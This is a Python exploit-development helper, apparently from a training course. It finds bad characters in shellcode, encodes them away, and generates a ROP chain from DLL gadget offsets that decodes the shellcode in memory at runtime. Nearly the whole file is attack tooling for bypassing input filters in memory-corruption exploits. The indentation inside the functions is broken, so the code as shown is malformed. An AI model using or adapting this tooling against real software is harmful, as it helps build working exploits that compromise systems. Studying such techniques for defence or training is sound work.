from struct import pack

OK  = "[+]"
LOG = "[*]"
ERR = "[-]"


def mapBadChars(shellcode):
    BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
    i = 0
      badIndices = []
       while i < len(shellcode):
            for c in BADCHARS:
                if shellcode[i] == c:
                    badIndices.append(i)
            i = i + 1
        return badIndices


def encodeShellcode(shellcode):
    BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
      REPLACECHARS = b"\xff\x10\x06\x07\x08\x05\x1f"
       encodedShell = shellcode
        for i in range(len(BADCHARS)):
            encodedShell = encodedShell.replace(pack("B", BADCHARS[i]), pack("B", REPLACECHARS[i]))
        return encodedShell


def decodeShellcode(dllBase, badIndices, shellcode):
    BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
      CHARSTOADD = b"\x01\xf9\x04\x04\x04\x08\x01"
       restoreRop = b""
        for i in range(len(badIndices)):
            if i == 0:
                offset = badIndices[i]
            else:
                offset = badIndices[i] - badIndices[i - 1]
            neg_offset = (-offset) & 0xffffffff
            value = 0
            for j in range(len(BADCHARS)):
                if shellcode[badIndices[i]] == BADCHARS[j]:
                    value = CHARSTOADD[j]
            value = (value << 8) | 0x11110011

            restoreRop += pack("<L", (dllBase + 0x117c))    # pop ecx ; ret
            restoreRop += pack("<L", (neg_offset))
            restoreRop += pack("<L", (dllBase + 0x4a7b6))  # sub eax, ecx ; pop ebx ; ret
            restoreRop += pack("<L", (value))               # values in BH
            restoreRop += pack("<L", (dllBase + 0x468ee))   # add [eax+1], bh ; ret
        return restoreRop


# def main():
#     shellcode = b"\x90\x90\x09\x90"
#     badIndices = mapBadChars(shellcode)
#     encodedShell = encodeShellcode(shellcode)
#     print(f"{OK} Encoded shellcode = {encodedShell}")
#
# if __name__ == "__main__":
#     main()
